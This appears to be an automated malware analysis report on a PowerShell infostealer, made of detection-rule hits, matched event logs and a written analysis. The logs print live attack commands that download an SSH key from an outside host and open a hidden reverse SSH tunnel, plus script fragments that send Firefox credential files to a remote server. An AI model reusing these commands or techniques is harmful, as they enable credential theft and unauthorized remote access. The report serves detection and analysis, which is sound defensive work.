sigma_analysis_results.rule_description: Detects suspicious PowerShell invocation with a parameter substring
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); EventID=1; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -nop -exec bypass -c "Invoke-WebRequest https://mail.zhblz.com/id_rsa -OutFile C:\Users\Bruno\AppData\Roaming\id_rsa;ssh recaptcha@203.161.50.145 -N -i C:\Users\Bruno\AppData\Roaming\id_rsa -R 0 -o StrictHostKeyChecking=no -o 'PermitLocalCommand=yes' -o 'LocalCommand=ssh -i \\45.61.169.221\key.pem user@1.1.1.1'" ; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Change PowerShell Policies to an Insecure Level
sigma_analysis_results.rule_description: Detects changing the PowerShell script execution policy to a potentially insecure level using the "-ExecutionPolicy" flag.

match_context.values: @{CommandLine=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -nop -exec bypass -c Invoke-WebRequest https://mail.zhblz.com/id_rsa -OutFile $env:APPDATA\id_rsa; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=1}

sigma_analysis_results.rule_title: Program Executed Using Proxy/Local Command Via SSH.EXE
sigma_analysis_results.rule_description: Detect usage of the "ssh.exe" binary as a proxy to launch other programs.

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values:
@{ScriptBlockText=#CHECKSSH
$flaskServerUrl = "https://mail.zhblz.com/endpoint"


# Function to check if SSH is available

#$commands = 'Invoke-WebRequest https://mail.zhblz.com/id_rsa -OutFile $env:APPDATA\id_rsa'
#Start-Process powershell -ArgumentList "-WindowStyle Hidden -nop -exec bypass -c `"$commands`""


function SSH-is-Exist {
    #$commands = 'Invoke-WebRequest https://mail.zhblz.com/id_rsa -OutFile $env:APPDATA\id_rsa'
    #Start-Process powershell -ArgumentList "-WindowStyle Hidden -nop -e [TRUNCATED]; Path=C:\Users\azure\Downloads\4e1bc758f08593a873e5e1d6f7d4eac05f690841abc90ddfa713c2bec4f9970f.ps1; ScriptBlockId=79701314-f118-4ff7-b346-6134abb6a596; MessageTotal=2; EventID=4104; MessageNumber=1}

@{ScriptBlockText=#CHECKSSH
$flaskServerUrl = "https://mail.zhblz.com/endpoint"


# Function to check if SSH is available

#$commands = 'Invoke-WebRequest https://mail.zhblz.com/id_rsa -OutFile $env:APPDATA\id_rsa'
#Start-Process powershell -ArgumentList "-WindowStyle Hidden -nop -exec bypass -c `"$commands`""


function SSH-is-Exist {
    #$commands = 'Invoke-WebRequest https://mail.zhblz.com/id_rsa -OutFile $env:APPDATA\id_rsa'
    #Start-Process powershell -ArgumentList "-WindowStyle Hidden -nop -e [TRUNCATED]; MessageTotal=2; ScriptBlockId=6b54cfe1-331e-4703-8bff-4df90c8c1a33; Path=C:\Users\Bruno\Desktop\sample.ps1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values:

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noLogo -ExecutionPolicy unrestricted -file "C:\Users\Bruno\Desktop\sample.ps1"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -nop -exec bypass -c "Invoke-WebRequest https://mail.zhblz.com/id_rsa -OutFile C:\Users\Bruno\AppData\Roaming\id_rsa;ssh recaptcha@203.161.50.145 -N -i C:\Users\Bruno\AppData\Roaming\id_rsa -R 0 -o StrictHostKeyChecking=no -o 'PermitLocalCommand=yes' -o 'LocalCommand=ssh -i \\45.61.169.221\key.pem user@1.1.1.1'" ; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{CommandLine=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -nop -exec bypass -c Invoke-WebRequest https://mail.zhblz.com/id_rsa -OutFile $env:APPDATA\id_rsa; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=1}

sigma_analysis_results.rule_title: PowerShell Script With File Upload Capabilities
sigma_analysis_results.rule_description: Detects PowerShell scripts leveraging the "Invoke-WebRequest" cmdlet to send data via either "PUT" or "POST" method.

match_context.values:
@{ScriptBlockText=#CHECKSSH
$flaskServerUrl = "https://mail.zhblz.com/endpoint"


# Function to check if SSH is available

#$commands = 'Invoke-WebRequest https://mail.zhblz.com/id_rsa -OutFile $env:APPDATA\id_rsa'
#Start-Process powershell -ArgumentList "-WindowStyle Hidden -nop -exec bypass -c `"$commands`""


function SSH-is-Exist {
    #$commands = 'Invoke-WebRequest https://mail.zhblz.com/id_rsa -OutFile $env:APPDATA\id_rsa'

@{ScriptBlockText=Function Send-FirefoxFilesToVPS
{
    <#
    .SYNOPSIS

    Sends the key4.db and logins.json files to a VPS server after converting them to Base64 strings.

    .DESCRIPTION

    Finds the key4.db and logins.json files in Firefox profiles, converts them to Base64 strings, and sends them to a VPS server via an HTTP POST request.
    #>

    $profilesDir = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles'
    $profiles = Get-ChildItem -Path $profilesDir | Where-Objec [TRUNCATED]; Path=C:\Users\Bruno\Desktop\sample.ps1; ScriptBlockId=1a519a01-3d98-4a3d-8dbf-7985733e98c3; MessageTotal=1; MessageNumber=1; EventID=4104}

crowdsourced_yara_results.description: Detects PowerShell invocation with suspicious parameters
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ids_results.rule_msg: ET SCAN Potential SSH Scan OUTBOUND
crowdsourced_ids_results.rule_raw: alert tcp $HOME_NET any -> $EXTERNAL_NET 22 (msg:"ET SCAN Potential SSH Scan OUTBOUND"; flow:to_server; flags:S,12; threshold: type threshold, track by_src, count 5, seconds 120; reference:url,en.wikipedia.org/wiki/Brute_force_attack; classtype:attempted-recon; sid:2003068; rev:7; metadata:created_at 2010_07_30, updated_at 2019_07_26;)

crowdsourced_ai_results.analysis:
The provided PowerShell code exhibits several characteristics that indicate malicious intent. The primary functionality of the code revolves around checking for SSH availability, downloading sensitive files (such as private keys and executable binaries) from a remote server, and establishing reverse SSH connections to potentially exfiltrate data.

1. SSH Functionality: The code defines a function `SSH-is-Exist` to check if SSH is installed on the system. If SSH is available, it attempts to use an SSH key downloaded from a specified URL (`https://mail.zhblz.com/id_rsa`) to connect to a remote server (`recaptcha@203.161.50.145`). This indicates an attempt to establish unauthorized access to another machine.

2. File Downloading: If SSH is not found, the script downloads `ssh.exe` and `libcrypto.dll` from the same suspicious domain. This behavior suggests that the script may be attempting to install its own version of SSH or related tools without user consent.

3. Data Exfiltration: The code includes functions designed to find and send sensitive Firefox profile files (like `logins.json` and `key4.db`) to a VPS server via HTTP POST requests. These files can contain stored passwords and other sensitive information, indicating a clear intention to steal user credentials.

4. Browser Manipulation: The script forcibly terminates running instances of browsers like Firefox, Chrome, Edge, and Opera before accessing their login data. This manipulation further supports the idea that the script is designed to harvest sensitive information without the user's knowledge.

5. Obfuscation Techniques: The presence of misleading comments and placeholder text in the code could serve to confuse analysts and hide its true purpose. For example, comments suggest benign actions while the actual commands perform harmful operations.

Overall, the combination of downloading executables, establishing unauthorized connections, and harvesting sensitive data strongly categorizes this code as malicious.

The code performs several actions:

1. SSH Check and Execution: It checks for the presence of SSH. If SSH exists, it executes a command that downloads a file (`id_rsa`) from `https://mail.zhblz.com/id_rsa` and then establishes an SSH tunnel.  If SSH is not found, it downloads `ssh.exe` and `libcrypto.dll` from `https://mail.zhblz.com/ssh` and `https://mail.zhblz.com/libcrypto` respectively, to the AppData directory, and then executes them.

2. Data Exfiltration: It sends a JSON message indicating the SSH status to a Flask server at `https://mail.zhblz.com/endpoint`.

3. Firefox Profile Data Extraction: It locates the Firefox profile directory and attempts to read `logins.json`, `places.sqlite`, `cookies.sqlite`, and `formhistory.sqlite`.  `logins.json` contents are printed to the console.  The code indicates that reading SQLite databases requires additional tools.

4. Firefox Data Upload: The code finds `key4.db` and `logins.json` in the Firefox profile. If found, these files are converted to Base64 strings and sent via HTTP POST requests to `https://mail.zhblz.com/upload`.  It restarts the Firefox process after stopping it.

5. Credentials Extraction from Browsers: The code extracts login credentials from Chrome, Edge, Opera, and Opera GX. Encrypted passwords are sent to a remote server (`$hq`, a parameter to the `pumpndump` function) for decryption.  The decrypted passwords are then printed to the console.


The code uses `Invoke-WebRequest` for downloading files and sending HTTP POST requests to various URLs.  The code utilizes `Start-Process` to execute external commands or files. There is obfuscated code within the `pumpndump` function that interacts with browser databases.  The  `pumpndump` function interacts with a remote server specified by the `$hq` parameter.
